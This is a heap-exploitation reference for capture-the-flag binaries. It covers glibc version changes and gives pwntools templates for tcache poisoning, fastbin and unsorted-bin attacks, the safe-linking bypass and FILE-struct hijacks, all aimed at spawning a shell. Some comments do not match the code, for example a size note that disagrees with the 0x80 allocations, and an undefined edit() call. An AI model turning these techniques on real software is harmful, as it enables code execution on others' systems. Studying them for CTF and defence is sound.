# Heap pwn

## glibc version deltas (MUST read)

Every heap technique is tightly bound to glibc version. Confirm first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc | Key change | Impact |
|-------|------------|--------|
| ≤ 2.26 | No tcache | unsorted/fastbin is the main battlefield |
| 2.27 | **tcache introduced** | tcache poisoning is extremely simple |
| 2.29 | unsorted-bin unlink hardened (chunk-size check) | unsorted-bin attack cut |
| 2.31 | extra tcache checks (key field) | tcache poisoning slightly harder |
| 2.32 | **safe-linking** (fd XOR PROTECT_PTR) | MUST leak heap base first |
| 2.34 | **__free_hook / __malloc_hook removed** | switch to FILE struct / exit handlers |
| 2.35+ | further hardening | same as 2.34; FILE path still works |

## tcache poisoning (2.27 - 2.31)

### Idea

tcache is a per-thread cache: one singly-linked list (fd only) per size class.
Double-free check before 2.29 only compared the list head to self, no walk.

### Exploit template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# alloc chunks larger than tcache (>0x408), free into unsorted bin; leftover main_arena ptr
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # prevent consolidate
for i in range(7):
    free(i)
free(7)       # 8th goes unsorted; fd/bk point at main_arena+96
add(9, 0x80)  # carve some back, keep fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# UAF rewrite chunk11 fd to __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # pop chunk11
add(13, 0x30, p64(libc.sym['system']))  # next alloc is __free_hook; write system

# trigger: free a chunk whose content is "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## Bypass safe-linking (2.32+)

```text
Idea: tcache/fastbin fd is XOR'd with PROTECT_PTR on write:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. MUST leak a heap address (heap base) first
2. Compute obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base (unsorted leftover / tcache fd leftover)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (classic; mainly ≤ 2.26)

```text
Keys:
1. fastbin is singly linked (fd only); no size check except chunk size MUST match
2. After 2.27 tcache is preferred; fastbin only after tcache is full
3. Still need a fake-looking chunk (size field = real chunk size, ± some)
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# rewrite fd to a fake chunk (size byte at fake_addr + 8 MUST match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # alloc at fake_addr
```

## unsorted-bin attack (≤ 2.28 only)

```text
Idea: write main_arena+88 to an arbitrary address
From 2.29: bck->fd == victim check; cannot bypass
Use: overwrite global_max_fast so small chunks also take fastbin → pair with fastbin attack
```

```python
# alloc unsorted-size chunk
add(0, 0x100)
add(1, 0x100)  # prevent top consolidation
free(0)
# UAF rewrite bk to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # take from unsorted → unlink → main_arena+88 written to target
```

## large-bin attack

```text
Idea: large bin adds fd_nextsize / bk_nextsize vs unsorted
From 2.32 also has chunk-size checks, but still usable to rewrite global_max_fast, _IO_list_all, etc.
Advanced; often combined in House of Husk and similar
```

## House of XXX cheat sheet

| Name | Versions | Core idea |
|------|----------|-----------|
| House of Force | ≤ 2.28 | rewrite top chunk size huge → malloc any address |
| House of Lore | all | fake small-bin chain → return any address |
| House of Orange | 2.23-2.30 | unsorted attack rewrite _IO_list_all → _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute + fastbin attack to __malloc_hook |
| House of Einherjar | all | fake prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted combo; bypass tcache double-free check |
| House of Husk | 2.27+ | rewrite printf hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable; for no-hook libc |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real exploit steps (generic 4)

```text
Step 1: leak heap base
  - alloc → free into tcache (2.32+ keeps obfuscated fd) → show → reverse heap
  - or: large chunk → free unsorted → carve back → show fd

Step 2: leak libc base
  - large chunk free into unsorted; fd/bk leftover main_arena
  - show → leak → libc.address = leak - main_arena_offset

Step 3: control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE-struct attack (_IO_2_1_stdout_ / stderr), rewrite vtable → _IO_wfile_jumps
  - or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → ROP on heap → execve
```

## Paths after libc 2.34 dropped hooks

### FILE-struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: puts/printf eventually hits _IO_file_xsputn → _IO_OVERFLOW → vtable call
Hijack:
  1. Overwrite _IO_2_1_stderr_ vtable ptr to a fake vtable
  2. Fake vtable: __overflow field → system or setcontext
  3. First 8 bytes of the FILE* itself are "/bin/sh\x00" (system's rdi)
Trigger: any puts/printf/abort/exit flushes stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Idea: __run_exit_handlers walks __exit_funcs and calls each dtor
Hijack: rewrite the node's func ptr to system, arg to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE; MUST leak fs:[0x30] guard in TLS to forge
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors walks a similar structure; also must bypass PTR_DEMANGLE
Use: runs on process exit; more general than FILE attack
```

## pwndbg / GEF heap debug commands

```text
# pwndbg
heap              # all chunks in current arena
bins              # tcache / fastbin / unsorted / small / large
tcache            # tcache alone
find_fake_fast <addr> <size>  # find an fd write site usable as fake chunk
vis_heap_chunks   # visualize heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools template (heap-menu challenges)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO wrappers
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === pick the technique stack from the vuln type ===
```

## Notes

- **glibc version is first-order** — same binary with 2.27 vs 2.34 libc has completely different exploit paths
- **tcache capacity = 7** per size class — spray 7 before overflow into unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (writable past 0x8 because next chunk's prev_size is reused)
- **Remote heap spray is unstable** — forking servers may differ in brk/mmap per connection; randomize tests
- **Do not leave unsorted leftovers in the attack chain** — a stray main_arena ptr in an unexpected chunk corrupts later show output
- **safe-linking error rate** — PROTECT_PTR is `pos >> 12`; pos is the write address, not the pointed-to address
